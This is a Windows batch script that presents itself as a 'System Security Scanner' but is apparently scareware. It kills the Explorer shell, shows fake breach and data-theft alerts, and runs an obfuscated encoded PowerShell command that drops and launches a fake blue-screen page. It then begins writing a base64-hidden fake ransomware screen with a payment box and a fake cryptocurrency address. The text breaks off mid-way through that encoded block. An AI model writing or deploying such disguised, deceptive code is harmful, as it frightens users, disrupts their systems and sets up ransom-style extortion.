@echo off
setlocal EnableDelayedExpansion
title System Security Scanner
color 0a
mode con: cols=80 lines=25

echo Initializing system security protocols...
timeout /t 2 >nul

taskkill /f /im explorer.exe >nul 2>&1
color 2

echo [WARNING] Multiple threats detected in system memory!
powershell -c "[console]::beep(800,200)" >nul 2>&1
timeout /t 1 >nul
echo [ALERT] Firewall breach confirmed!
powershell -c "[console]::beep(900,200)" >nul 2>&1
timeout /t 1 >nul
echo [CRITICAL] System32 corruption detected!
powershell -c "[console]::beep(1000,300)" >nul 2>&1
color 4
timeout /t 1 >nul

msg * "CRITICAL ERROR: System memory breach detected!"
timeout /t 1 >nul
msg * "Firewall has been breached! Remote access granted to unknown host."
timeout /t 1 >nul

echo.
echo Attempting emergency system recovery...
timeout /t 2 >nul
echo [FAILED] Recovery unsuccessful!
timeout /t 1 >nul
echo [FATAL] Critical system files compromised!
timeout /t 1 >nul
msg * "System recovery failed. All backups have been encrypted."

color 6
echo.
echo Analyzing malware signatures...
timeout /t 1 >nul
echo - Trojan.Generic.45XX
echo - Worm.Win32.AutoRun
echo - Rootkit.Boot.Master
echo - Ransomware.Win32.CryptoLock.A
echo - Spyware.Password.Stealer.X
echo - Backdoor.RemoteShell.Z
timeout /t 2 >nul
msg * "Multiple severe malware signatures detected on this system!"

color 2
echo.
echo Initiating deep system scan...
for /l %%i in (1,1,20) do (
    echo Scanning sector %%i/20...
    >nul ping -n 1 -w 120 127.0.0.1
)
echo.
echo [ERROR] System integrity compromised beyond repair!
color 4
timeout /t 1 >nul

msg * "System integrity compromised beyond repair!"
timeout /t 1 >nul
msg * "Windows will restart in 60 seconds!"
timeout /t 1 >nul
msg * "Your personal data is being stolen!"
timeout /t 1 >nul
msg * "CRITICAL: Terminating all non-essential processes..."

color 1
echo.
echo Dumping physical memory to crash log...
echo 0x00000000  48 83 EC 28 E8 00 00 00 00 48 83 C4 28 C3 CC CC
echo 0x00000010  48 89 5C 24 08 48 89 74 24 10 57 48 83 EC 20 48
echo 0x00000020  8B F9 48 8B DA 48 8B F1 E8 00 00 00 00 84 C0 74
echo 0x00000030  05 48 8B C3 EB 02 33 C0 48 8B 5C 24 30 48 8B 74
timeout /t 1 >nul

powershell -NoProfile -EncodedCommand JABoAHQAYQA9AEAAJwAKADwAIQBEAE8AQwBUAFkAUABFACAAaAB0AG0AbAA+AAoAPABoAHQAbQBsAD4ACgA8AGgAZQBhAGQAPgAKADwAbQBlAHQAYQAgAGgAdAB0AHAALQBlAHEAdQBpAHYAPQAiAFgALQBVAEEALQBDAG8AbQBwAGEAdABpAGIAbABlACIAIABjAG8AbgB0AGUAbgB0AD0AIgBJAEUAPQBlAGQAZwBlACIAPgAKADwAaAB0AGEAOgBhAHAAcABsAGkAYwBhAHQAaQBvAG4AIABiAG8AcgBkAGUAcgA9ACIAbgBvAG4AZQAiACAAYwBhAHAAdABpAG8AbgA9ACIAbgBvACIAIABtAGEAeABpAG0AaQB6AGUAYgB1AHQAdABvAG4APQAiAG4AbwAiACAAbQBpAG4AaQBtAGkAegBlAGIAdQB0AHQAbwBuAD0AIgBuAG8AIgAgAHMAaABvAHcAaQBuAHQAYQBzAGsAYgBhAHIAPQAiAG4AbwAiACAAcwBpAG4AZwBsAGUAaQBuAHMAdABhAG4AYwBlAD0AIgB5AGUAcwAiACAAcwB5AHMAbQBlAG4AdQA9ACIAbgBvACIAIAB3AGkAbgBkAG8AdwBzAHQAYQB0AGUAPQAiAG0AYQB4AGkAbQBpAHoAZQAiAD4ACgA8AHMAYwByAGkAcAB0ACAAbABhAG4AZwB1AGEAZwBlAD0AIgBWAEIAUwBjAHIAaQBwAHQAIgA+AAoAUwB1AGIAIABXAGkAbgBkAG8AdwBfAE8AbgBMAG8AYQBkAAoAdwBpAG4AZABvAHcALgBtAG8AdgBlAFQAbwAgADAALAAgADAACgB3AGkAbgBkAG8AdwAuAHIAZQBzAGkAegBlAFQAbwAgAHMAYwByAGUAZQBuAC4AdwBpAGQAdABoACwAIABzAGMAcgBlAGUAbgAuAGgAZQBpAGcAaAB0AAoARQBuAGQAIABTAHUAYgAKADwALwBzAGMAcgBpAHAAdAA+AAoAPABzAHQAeQBsAGUAPgAKAGIAbwBkAHkAewBtAGEAcgBnAGkAbgA6ADAAOwBwAGEAZABkAGkAbgBnADoANgAwAHAAeAA7AGIAYQBjAGsAZwByAG8AdQBuAGQAOgAjADAAMAA3ADgARAA3ADsAYwBvAGwAbwByADoAIwBmAGYAZgA7AGYAbwBuAHQALQBmAGEAbQBpAGwAeQA6ACIAUwBlAGcAbwBlACAAVQBJACIALABzAGEAbgBzAC0AcwBlAHIAaQBmADsAYwB1AHIAcwBvAHIAOgBuAG8AbgBlADsAfQAKAC4AZgB7AGYAbwBuAHQALQBzAGkAegBlADoAMQAyADAAcAB4ADsAbQBhAHIAZwBpAG4ALQBiAG8AdAB0AG8AbQA6ADQAMABwAHgAOwB9AAoALgBtAHsAZgBvAG4AdAAtAHMAaQB6AGUAOgAyADgAcAB4ADsAbQBhAHIAZwBpAG4ALQBiAG8AdAB0AG8AbQA6ADQAMABwAHgAOwB9AAoALgBwAHsAZgBvAG4AdAAtAHMAaQB6AGUAOgAyADQAcAB4ADsAfQAKAC4AYgB7AHAAbwBzAGkAdABpAG8AbgA6AGEAYgBzAG8AbAB1AHQAZQA7AGIAbwB0AHQAbwBtADoANgAwAHAAeAA7AGYAbwBuAHQALQBzAGkAegBlADoAMQA2AHAAeAA7AH0ACgA8AC8AcwB0AHkAbABlAD4ACgA8AC8AaABlAGEAZAA+AAoAPABiAG8AZAB5AD4ACgA8AGQAaQB2ACAAYwBsAGEAcwBzAD0AIgBmACIAPgA6ACgAPAAvAGQAaQB2AD4ACgA8AGQAaQB2ACAAYwBsAGEAcwBzAD0AIgBtACIAPgBZAG8AdQByACAAUABDACAAcgBhAG4AIABpAG4AdABvACAAYQAgAHAAcgBvAGIAbABlAG0AIABhAG4AZAAgAG4AZQBlAGQAcwAgAHQAbwAgAHIAZQBzAHQAYQByAHQALgAgAFcAZQAnAHIAZQAgAGoAdQBzAHQAIABjAG8AbABsAGUAYwB0AGkAbgBnACAAcwBvAG0AZQAgAGUAcgByAG8AcgAgAGkAbgBmAG8ALAAgAGEAbgBkACAAdABoAGUAbgAgAHcAZQAnAGwAbAAgAHIAZQBzAHQAYQByAHQAIABmAG8AcgAgAHkAbwB1AC4APAAvAGQAaQB2AD4ACgA8AGQAaQB2ACAAYwBsAGEAcwBzAD0AIgBwACIAIABpAGQAPQAiAHAAIgA+ADAAJQAgAGMAbwBtAHAAbABlAHQAZQA8AC8AZABpAHYAPgAKADwAZABpAHYAIABjAGwAYQBzAHMAPQAiAGIAIgA+ADwAZABpAHYAPgBJAGYAIAB5AG8AdQAnAGQAIABsAGkAawBlACAAdABvACAAawBuAG8AdwAgAG0AbwByAGUALAAgAHkAbwB1ACAAYwBhAG4AIABzAGUAYQByAGMAaAAgAG8AbgBsAGkAbgBlACAAbABhAHQAZQByACAAZgBvAHIAIAB0AGgAaQBzACAAZQByAHIAbwByADoAIABJAFIAUQBMAF8ATgBPAFQAXwBMAEUAUwBTAF8ATwBSAF8ARQBRAFUAQQBMADwALwBkAGkAdgA+ADwALwBkAGkAdgA+AAoAPABzAGMAcgBpAHAAdAA+AAoAdgBhAHIAIABwAD0AMAA7AAoAcwBlAHQASQBuAHQAZQByAHYAYQBsACgAZgB1AG4AYwB0AGkAbwBuACgAKQB7AAoAIAAgACAAIABwACsAPQBNAGEAdABoAC4AZgBsAG8AbwByACgATQBhAHQAaAAuAHIAYQBuAGQAbwBtACgAKQAqADEANQApADsACgAgACAAIAAgAGkAZgAoAHAAPgAxADAAMAApACAAcAA9ADEAMAAwADsACgAgACAAIAAgAGQAbwBjAHUAbQBlAG4AdAAuAGcAZQB0AEUAbABlAG0AZQBuAHQAQgB5AEkAZAAoACIAcAAiACkALgBpAG4AbgBlAHIAVABlAHgAdAA9AHAAKwAiACUAIABjAG8AbQBwAGwAZQB0AGUAIgA7AAoAfQAsADgAMAAwACkAOwAKADwALwBzAGMAcgBpAHAAdAA+AAoAPAAvAGIAbwBkAHkAPgAKADwALwBoAHQAbQBsAD4ACgAnAEAAOwAgACQAaAB0AGEAIAB8ACAATwB1AHQALQBGAGkAbABlACAALQBFAG4AYwBvAGQAaQBuAGcAIABBAFMAQwBJAEkAIAAnACQAZQBuAHYAOgBUAEUATQBQAFwAYgBzAG8AZABfAHAAcgBhAG4AawAuAGgAdABhACcA
set "bsodhta=%TEMP%\bsod_prank.hta"
start "" "%bsodhta%"
timeout /t 4 >nul
taskkill /f /im mshta.exe >nul 2>&1

color 0
cls
echo.
timeout /t 2 >nul

set "htmlfile=%TEMP%\ransomware_prank.html"
echo -----BEGIN CERTIFICATE----- > "%htmlfile%.b64"
echo PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxtZXRhIGNo >> "%htmlfile%.b64"
echo YXJzZXQ9IlVURi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9Indp >> "%htmlfile%.b64"
echo ZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgo8dGl0bGU+Q0FN >> "%htmlfile%.b64"
echo WlpaIC8vIERFQ1JZUFRJT04gUEFORUw8L3RpdGxlPgoKPHN0eWxlPgpAaW1wb3J0 >> "%htmlfile%.b64"
echo IHVybCgnaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1W >> "%htmlfile%.b64"
echo VDMyMyZmYW1pbHk9U2hhcmUrVGVjaCtNb25vJmZhbWlseT1GaXJhK0NvZGUmZGlz >> "%htmlfile%.b64"
echo cGxheT1zd2FwJyk7CgoqIHsKICAgIG1hcmdpbjogMDsKICAgIHBhZGRpbmc6IDA7 >> "%htmlfile%.b64"
echo CiAgICBib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgY3Vyc29yOiBjcm9zc2hh >> "%htmlfile%.b64"
echo aXI7IAp9CgpodG1sLCBib2R5IHsKICAgIHdpZHRoOiAxMDAlOwogICAgaGVpZ2h0 >> "%htmlfile%.b64"
echo OiAxMDAlOwogICAgb3ZlcmZsb3c6IGhpZGRlbjsKICAgIGJhY2tncm91bmQ6ICMw >> "%htmlfile%.b64"
echo MDA7CiAgICBjb2xvcjogI2ZmZjsKICAgIGZvbnQtZmFtaWx5OiAnU2hhcmUgVGVj >> "%htmlfile%.b64"
echo aCBNb25vJywgbW9ub3NwYWNlOwp9Cgpib2R5IHsKICAgIGRpc3BsYXk6IGZsZXg7 >> "%htmlfile%.b64"
echo CiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgIGFsaWduLWl0ZW1zOiBj >> "%htmlfile%.b64"
echo ZW50ZXI7CiAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICBmaWx0ZXI6IHNlcGlh >> "%htmlfile%.b64"
echo KDAuMikgc2F0dXJhdGUoMS4yKSBjb250cmFzdCgxLjEpOyAvKiBMw6lnZXIgZWZm >> "%htmlfile%.b64"
echo ZXQgcsOpdHJvLWNvdWxldXIgKi8KfQoKLyogQ1JUIEVGRkVDVCAoc2NhbmxpbmVz >> "%htmlfile%.b64"
echo KSAqLwpib2R5OjpiZWZvcmUgewogICAgY29udGVudDogIiI7CiAgICBwb3NpdGlv >> "%htmlfile%.b64"
echo bjogZml4ZWQ7CiAgICBpbnNldDogMDsKICAgIGJhY2tncm91bmQ6CiAgICAgICAg >> "%htmlfile%.b64"
echo bGluZWFyLWdyYWRpZW50KHJnYmEoMjU1LDI1NSwyNTUsMC4wMSkgNTAlLCByZ2Jh >> "%htmlfile%.b64"
echo KDAsMCwwLDAuMSkgNTAlKSwKICAgICAgICBsaW5lYXItZ3JhZGllbnQoOTBkZWcs >> "%htmlfile%.b64"
echo IHJnYmEoMjU1LDI1NSwyNTUsMC4wMSksIHJnYmEoMCwwLDAsMC4wMSkpOwogICAg >> "%htmlfile%.b64"
echo YmFja2dyb3VuZC1zaXplOiAxMDAlIDRweCwgNHB4IDEwMCU7CiAgICBwb2ludGVy >> "%htmlfile%.b64"
echo LWV2ZW50czogbm9uZTsKICAgIHotaW5kZXg6IDEwMDsKfQoKLyogTMOpZ2VyIGVm >> "%htmlfile%.b64"
echo ZmV0IGRlIHZpZ25ldHRhZ2UgKi8KYm9keTo6YWZ0ZXIgewogICAgY29udGVudDog >> "%htmlfile%.b64"
echo IiI7CiAgICBwb3NpdGlvbjogZml4ZWQ7CiAgICBpbnNldDogMDsKICAgIGJhY2tn >> "%htmlfile%.b64"
echo cm91bmQ6IHJhZGlhbC1ncmFkaWVudChjaXJjbGUsIHRyYW5zcGFyZW50IDYwJSwg >> "%htmlfile%.b64"
echo cmdiYSgwLDAsMCwwLjgpIDEwMCUpOwogICAgcG9pbnRlci1ldmVudHM6IG5vbmU7 >> "%htmlfile%.b64"
echo CiAgICB6LWluZGV4OiA5OTsKfQoKLmNvbnRhaW5lciB7CiAgICB3aWR0aDogOTUl >> "%htmlfile%.b64"
echo OwogICAgbWF4LXdpZHRoOiAxMjAwcHg7CiAgICBoZWlnaHQ6IDkydmg7CiAgICBi >> "%htmlfile%.b64"
echo YWNrZ3JvdW5kOiByZ2JhKDEwLDEwLDEwLDAuOTgpOwogICAgYm9yZGVyOiAxcHgg >> "%htmlfile%.b64"
echo c29saWQgIzMzMzsKICAgIGJveC1zaGFkb3c6IDAgMCA1MHB4IHJnYmEoMjU1LDI1 >> "%htmlfile%.b64"
echo NSwyNTUsMC4wNSk7CiAgICBkaXNwbGF5OiBncmlkOwogICAgZ3JpZC10ZW1wbGF0 >> "%htmlfile%.b64"
echo ZS1jb2x1bW5zOiAzNTBweCAxZnI7CiAgICBvdmVyZmxvdzogaGlkZGVuOwogICAg >> "%htmlfile%.b64"
echo cG9zaXRpb246IHJlbGF0aXZlOwogICAgYW5pbWF0aW9uOiBib290SW4gMC41cyBl >> "%htmlfile%.b64"
echo YXNlLW91dDsKfQoKQGtleWZyYW1lcyBib290SW4gewogICAgZnJvbSB7IG9wYWNp >> "%htmlfile%.b64"
echo dHk6IDA7IHRyYW5zZm9ybTogc2NhbGUoMC45KSB0cmFuc2xhdGVZKDIwcHgpOyB9 >> "%htmlfile%.b64"
echo CiAgICB0byB7IG9wYWNpdHk6IDE7IHRyYW5zZm9ybTogc2NhbGUoMSkgdHJhbnNs >> "%htmlfile%.b64"
echo YXRlWSgwKTsgfQp9Cgouc2lkZWJhciB7CiAgICBib3JkZXItcmlnaHQ6IDFweCBz >> "%htmlfile%.b64"
echo b2xpZCAjMjIyOwogICAgYmFja2dyb3VuZDogIzA1MDUwNTsKICAgIHBhZGRpbmc6 >> "%htmlfile%.b64"
echo IDQwcHg7CiAgICBkaXNwbGF5OiBmbGV4OwogICAgZmxleC1kaXJlY3Rpb246IGNv >> "%htmlfile%.b64"
echo bHVtbjsKICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7Cn0KCi8qIE1BU1FVRSBGIFNP >> "%htmlfile%.b64"
echo Q0lFVFkgU1RZTElTw4kgKi8KLm1hc2stbG9nbyB7CiAgICB3aWR0aDogMjIwcHg7 >> "%htmlfile%.b64"
echo CiAgICBoZWlnaHQ6IDIyMHB4OwogICAgYmFja2dyb3VuZC1pbWFnZTogdXJsKCdo >> "%htmlfile%.b64"
echo dHRwczovL3VwbG9hZC53aWtpbWVkaWEub3JnL3dpa2lwZWRpYS9jb21tb25zL3Ro >> "%htmlfile%.b64"
echo dW1iLzAvMDQvTWFzcXVlX2RlX0d1eV9GYXdrZXNfYXJib3IlQzMlQTlfcGFyX1Yu >> "%htmlfile%.b64"
echo c3ZnLzUwMHB4LU1hc3F1ZV9kZV9HdXlfRmF3a2VzX2FyYm9yJUMzJUE5X3Bhcl9W >> "%htmlfile%.b64"
echo LnN2Zy5wbmcnKTsKICAgIGJhY2tncm91bmQtc2l6ZTogY29udGFpbjsKICAgIGJh >> "%htmlfile%.b64"
echo Y2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7CiAgICBiYWNrZ3JvdW5kLXBvc2l0 >> "%htmlfile%.b64"
echo aW9uOiBjZW50ZXI7CiAgICBmaWx0ZXI6IGdyYXlzY2FsZSgxKSBicmlnaHRuZXNz >> "%htmlfile%.b64"
echo KDAuOCkgY29udHJhc3QoMS4yKTsKICAgIGFuaW1hdGlvbjogZ2xpdGNoTWFzayA0 >> "%htmlfile%.b64"
echo cyBpbmZpbml0ZTsKICAgIG1hcmdpbi1ib3R0b206IDIwcHg7Cn0KCkBrZXlmcmFt >> "%htmlfile%.b64"
echo ZXMgZ2xpdGNoTWFzayB7CiAgICAwJSwgMTAwJSB7IHRyYW5zZm9ybTogdHJhbnNs >> "%htmlfile%.b64"
echo YXRlKDApOyBmaWx0ZXI6IGdyYXlzY2FsZSgxKSBicmlnaHRuZXNzKDAuOCk7IH0K >> "%htmlfile%.b64"
echo ICAgIDElIHsgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTJweCwgMnB4KTsgZmlsdGVy >> "%htmlfile%.b64"
echo OiBncmF5c2NhbGUoMSkgYnJpZ2h0bmVzcygxLjIpIHNlcGlhKDEpIGh1ZS1yb3Rh >> "%htmlfile%.b64"
echo dGUoMTAwZGVnKTsgfQogICAgMiUgeyB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgycHgs >> "%htmlfile%.b64"
echo IC0ycHgpOyBmaWx0ZXI6IGdyYXlzY2FsZSgwKSBicmlnaHRuZXNzKDEpOyB9CiAg >> "%htmlfile%.b64"
echo ICAzJSB7IHRyYW5zZm9ybTogdHJhbnNsYXRlKDApOyBmaWx0ZXI6IGdyYXlzY2Fs >> "%htmlfile%.b64"
echo ZSgxKSBicmlnaHRuZXNzKDAuOCk7IH0KfQoKLmJyYW5kIHsKICAgIHRleHQtYWxp >> "%htmlfile%.b64"
echo Z246IGNlbnRlcjsKICAgIGZvbnQtc2l6ZTogNDhweDsKICAgIGxldHRlci1zcGFj >> "%htmlfile%.b64"
echo aW5nOiA4cHg7CiAgICBmb250LWZhbWlseTogJ1ZUMzIzJywgbW9ub3NwYWNlOwog >> "%htmlfile%.b64"
echo ICAgY29sb3I6ICNmZmY7Cn0KCi5icmFuZC1zdWIgewogICAgdGV4dC1hbGlnbjog >> "%htmlfile%.b64"
echo Y2VudGVyOwogICAgY29sb3I6ICM4ODg7CiAgICBtYXJnaW4tdG9wOiA1cHg7CiAg >> "%htmlfile%.b64"
echo ICBmb250LXNpemU6IDEzcHg7CiAgICBsZXR0ZXItc3BhY2luZzogNHB4OwogICAg >> "%htmlfile%.b64"
echo dGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsKfQoKLnN0YXR1cy1ib3ggewogICAg >> "%htmlfile%.b64"
echo bWFyZ2luLXRvcDogNTBweDsKICAgIHdpZHRoOiAxMDAlOwogICAgYm9yZGVyOiAx >> "%htmlfile%.b64"
echo cHggc29saWQgIzIyMjsKICAgIHBhZGRpbmc6IDIwcHg7CiAgICBiYWNrZ3JvdW5k >> "%htmlfile%.b64"
echo OiAjMDAwOwp9Cgouc3RhdHVzLWxpbmUgewogICAgZGlzcGxheTogZmxleDsKICAg >> "%htmlfile%.b64"
echo IGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjsKICAgIG1hcmdpbi1ib3R0 >> "%htmlfile%.b64"
echo b206IDE1cHg7CiAgICBmb250LXNpemU6IDE0cHg7CiAgICBjb2xvcjogI2FhYTsK >> "%htmlfile%.b64"
echo fQoKLnN0YXR1cy1kb3QgewogICAgd2lkdGg6IDEwcHg7CiAgICBoZWlnaHQ6IDEw >> "%htmlfile%.b64"
echo cHg7CiAgICBib3JkZXItcmFkaXVzOiA1MCU7CiAgICBiYWNrZ3JvdW5kOiAjZmZm >> "%htmlfile%.b64"
echo OwogICAgYm94LXNoYWRvdzogMCAwIDVweCAjZmZmOwogICAgbWFyZ2luLXRvcDog >> "%htmlfile%.b64"
echo NHB4OwogICAgYW5pbWF0aW9uOiBwdWxzZSAxLjVzIGluZmluaXRlOwp9CgpAa2V5 >> "%htmlfile%.b64"
echo ZnJhbWVzIHB1bHNlIHsKICAgIDAlIHsgb3BhY2l0eTogMC40OyB0cmFuc2Zvcm06 >> "%htmlfile%.b64"
echo IHNjYWxlKDEpOyB9CiAgICA1MCUgeyBvcGFjaXR5OiAxOyB0cmFuc2Zvcm06IHNj >> "%htmlfile%.b64"
echo YWxlKDEuMSk7IH0KICAgIDEwMCUgeyBvcGFjaXR5OiAwLjQ7IHRyYW5zZm9ybTog >> "%htmlfile%.b64"
echo c2NhbGUoMSk7IH0KfQoKLm1haW4gewogICAgcGFkZGluZzogNTBweDsKICAgIHBv >> "%htmlfile%.b64"
echo c2l0aW9uOiByZWxhdGl2ZTsKICAgIG92ZXJmbG93LXk6IGF1dG87IC8qIFBlcm1l >> "%htmlfile%.b64"
echo dCBsZSBzY3JvbGwgc2kgbGUgY29udGVudSBkw6lwYXNzZSAqLwp9Cgoud2Fybmlu >> "%htmlfile%.b64"
echo Zy10aXRsZSB7CiAgICBmb250LXNpemU6IDU2cHg7CiAgICBsaW5lLWhlaWdodDog >> "%htmlfile%.b64"
echo MS4xOwogICAgbGV0dGVyLXNwYWNpbmc6IDJweDsKICAgIGZvbnQtZmFtaWx5OiAn >> "%htmlfile%.b64"
echo VlQzMjMnLCBtb25vc3BhY2U7CiAgICBjb2xvcjogI2ZmZjsKfQoKLndhcm5pbmct >> "%htmlfile%.b64"
echo c3ViIHsKICAgIGNvbG9yOiAjYWFhOwogICAgbWFyZ2luLXRvcDogMjBweDsKICAg >> "%htmlfile%.b64"
echo IG1heC13aWR0aDogNzUwcHg7CiAgICBsaW5lLWhlaWdodDogMS44OwogICAgZm9u >> "%htmlfile%.b64"
echo dC1zaXplOiAxNnB4Owp9CgoudGltZXItYm94IHsKICAgIG1hcmdpbi10b3A6IDQw >> "%htmlfile%.b64"
echo cHg7CiAgICBiYWNrZ3JvdW5kOiAjMGEwYTBhOwogICAgYm9yZGVyOiAxcHggc29s >> "%htmlfile%.b64"
echo aWQgIzIyMjsKICAgIHBhZGRpbmc6IDMwcHg7CiAgICB0ZXh0LWFsaWduOiBjZW50 >> "%htmlfile%.b64"
echo ZXI7Cn0KCi50aW1lci1sYWJlbCB7CiAgICBjb2xvcjogIzg4ODsKICAgIGxldHRl >> "%htmlfile%.b64"
echo ci1zcGFjaW5nOiA0cHg7CiAgICBmb250LXNpemU6IDEzcHg7CiAgICBtYXJnaW4t >> "%htmlfile%.b64"
echo Ym90dG9tOiAxNXB4OwogICAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsKfQoK >> "%htmlfile%.b64"
echo I3RpbWVyIHsKICAgIGZvbnQtc2l6ZTogODRweDsKICAgIGZvbnQtZmFtaWx5OiAn >> "%htmlfile%.b64"
echo VlQzMjMnLCBtb25vc3BhY2U7CiAgICBsZXR0ZXItc3BhY2luZzogOHB4OwogICAg >> "%htmlfile%.b64"
echo Y29sb3I6ICNmZmY7Cn0KCi50ZXJtaW5hbCB7CiAgICBtYXJnaW4tdG9wOiA0MHB4 >> "%htmlfile%.b64"
echo OwogICAgYmFja2dyb3VuZDogIzAwMDsKICAgIGJvcmRlcjogMXB4IHNvbGlkICMy >> "%htmlfile%.b64"
echo MjI7CiAgICBoZWlnaHQ6IDMyMHB4OwogICAgb3ZlcmZsb3c6IGhpZGRlbjsKICAg >> "%htmlfile%.b64"
echo IHBhZGRpbmc6IDIwcHg7CiAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICBmb250 >> "%htmlfile%.b64"
echo LWZhbWlseTogJ0ZpcmEgQ29kZScsIG1vbm9zcGFjZTsgLyogUG9saWNlIGRlIGNv >> "%htmlfile%.b64"
echo ZGUgcGx1cyBwcm9wcmUgKi8KfQoKLnRlcm1pbmFsLWhlYWRlciB7CiAgICBjb2xv >> "%htmlfile%.b64"
echo cjogIzY2NjsKICAgIG1hcmdpbi1ib3R0b206IDE1cHg7CiAgICBmb250LXNpemU6 >> "%htmlfile%.b64"
echo IDE0cHg7CiAgICBsZXR0ZXItc3BhY2luZzogM3B4OwogICAgdGV4dC10cmFuc2Zv >> "%htmlfile%.b64"
echo cm06IHVwcGVyY2FzZTsKfQoKLmxpbmUgewogICAgZm9udC1zaXplOiAxM3B4Owog >> "%htmlfile%.b64"
echo ICAgY29sb3I6ICM4ZjhmOGY7CiAgICBtYXJnaW4tYm90dG9tOiA3cHg7CiAgICBv >> "%htmlfile%.b64"
echo cGFjaXR5OiAwOwogICAgYW5pbWF0aW9uOiBmYWRlSW5MaW5lIDAuM3MgZm9yd2Fy >> "%htmlfile%.b64"
echo ZHM7CiAgICB3aGl0ZS1zcGFjZTogbm93cmFwOwp9CgpAa2V5ZnJhbWVzIGZhZGVJ >> "%htmlfile%.b64"
echo bkxpbmUgewogICAgdG8geyBvcGFjaXR5OiAxOyB9Cn0KCi5wYXltZW50LWJveCB7 >> "%htmlfile%.b64"
echo CiAgICBtYXJnaW4tdG9wOiA0MHB4OwogICAgYm9yZGVyOiAxcHggZGFzaGVkICM0 >> "%htmlfile%.b64"
echo NDQ7CiAgICBwYWRkaW5nOiAyNXB4OwogICAgYmFja2dyb3VuZDogIzA1MDUwNTsK >> "%htmlfile%.b64"
echo fQoKLnBheW1lbnQtdGl0bGUgewogICAgY29sb3I6ICM5OTk7CiAgICBtYXJnaW4t >> "%htmlfile%.b64"
echo Ym90dG9tOiAxNXB4OwogICAgZm9udC1zaXplOiAxNHB4OwogICAgbGV0dGVyLXNw >> "%htmlfile%.b64"
echo YWNpbmc6IDNweDsKICAgIHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7Cn0KCi8q >> "%htmlfile%.b64"
echo IEFEUkVTU0UgQ1JZUFRPIEZBVVNTRSBNQUlTIENSw4lESUJMRSAqLwouYnRjIHsK >> "%htmlfile%.b64"
echo ICAgIGZvbnQtc2l6ZTogMTdweDsKICAgIHdvcmQtYnJlYWs6IGJyZWFrLWFsbDsK >> "%htmlfile%.b64"
echo ICAgIGNvbG9yOiAjZmZmOwogICAgYmFja2dyb3VuZDogIzExMTsKICAgIHBhZGRp >> "%htmlfile%.b64"
echo bmc6IDEwcHg7CiAgICBib3JkZXI6IDFweCBzb2xpZCAjMzMzOwogICAgdXNlci1z >> "%htmlfile%.b64"
echo ZWxlY3Q6IGFsbDsgLyogUGVybWV0IGRlIHRvdXQgc8OpbGVjdGlvbm5lciBhdSBj >> "%htmlfile%.b64"
echo bGljICovCn0KCi5mb290ZXIgewogICAgcG9zaXRpb246IGFic29sdXRlOwogICAg >> "%htmlfile%.b64"
echo Ym90dG9tOiAzMHB4OwogICAgcmlnaHQ6IDUwcHg7CiAgICBjb2xvcjogIzMzMzsK >> "%htmlfile%.b64"
echo ICAgIGxldHRlci1zcGFjaW5nOiAxMnB4OwogICAgZm9udC1zaXplOiAxNXB4Owog >> "%htmlfile%.b64"
echo ICAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsKfQoKLyogRWZmZXQgZGUgZ2xp >> "%htmlfile%.b64"
echo dGNoIGFsw6lhdG9pcmUgc3VyIHRvdXRlIGxhIHBhZ2UgKi8KLmdsaXRjaC1vdmVy >> "%htmlfile%.b64"
echo bGF5IHsKICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgIGluc2V0OiAwOwogICAgcG9p >> "%htmlfile%.b64"
echo bnRlci1ldmVudHM6IG5vbmU7CiAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwyNTUs >> "%htmlfile%.b64"
echo MjU1LDAuMDUpOwogICAgb3BhY2l0eTogMDsKICAgIHotaW5kZXg6IDExMDsKfQoK >> "%htmlfile%.b64"
echo PC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KCjxkaXYgY2xhc3M9ImdsaXRjaC1vdmVy >> "%htmlfile%.b64"
echo bGF5IiBpZD0iZ2xpdGNoIj48L2Rpdj4KCjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+ >> "%htmlfile%.b64"
echo CgogICAgPGRpdiBjbGFzcz0ic2lkZWJhciI+CiAgICAgICAgPGRpdiBjbGFzcz0i >> "%htmlfile%.b64"
echo bWFzay1sb2dvIj48L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0iYnJhbmQiPkNB >> "%htmlfile%.b64"
echo TVpaWjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImJyYW5kLXN1YiI+WW91IGdv >> "%htmlfile%.b64"
echo dCBoYWNrZWQ8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0ic3RhdHVzLWJveCI+ >> "%htmlfile%.b64"
echo CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0YXR1cy1saW5lIj48c3Bhbj5ORVRX >> "%htmlfile%.b64"
echo T1JLIFNUQVRVUzwvc3Bhbj48ZGl2IGNsYXNzPSJzdGF0dXMtZG90Ij48L2Rpdj48 >> "%htmlfile%.b64"
echo L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RhdHVzLWxpbmUiPjxzcGFu >> "%htmlfile%.b64"
echo PkZJTEVTIExPQ0tFRDwvc3Bhbj48ZGl2IGNsYXNzPSJzdGF0dXMtZG90Ij48L2Rp >> "%htmlfile%.b64"
echo dj48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RhdHVzLWxpbmUiPjxz >> "%htmlfile%.b64"
echo cGFuPkJBQ0tVUFMgRElTQ09OTkVDVEVEPC9zcGFuPjxkaXYgY2xhc3M9InN0YXR1 >> "%htmlfile%.b64"
